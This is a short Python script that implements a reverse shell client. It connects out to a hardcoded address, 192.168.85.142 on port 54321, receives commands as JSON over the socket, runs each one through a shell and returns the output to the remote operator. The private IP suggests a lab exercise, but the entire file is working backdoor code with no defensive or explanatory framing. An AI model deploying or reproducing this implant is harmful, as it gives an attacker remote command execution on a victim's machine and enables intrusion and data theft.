#!/usr/bin/python
import socket
import subprocess
import json

#send more than 1024
def reliable_send(data):
        json_data = json.dumps(data)
        sock.send(json_data)
def reliable_recv():
        data = ""
        while True:
                try:
                        data = data + sock.recv(1024)
                        return json.loads(data)
                except ValueError:
                        continue
                        




def shell():
	while True:
		command = reliable_recv()
		if command =='q':
			break
		else:
			proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

			result = proc.stdout.read() + proc.stderr.read() 
			reliable_send(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.85.142", 54321))
shell()
sock.close()
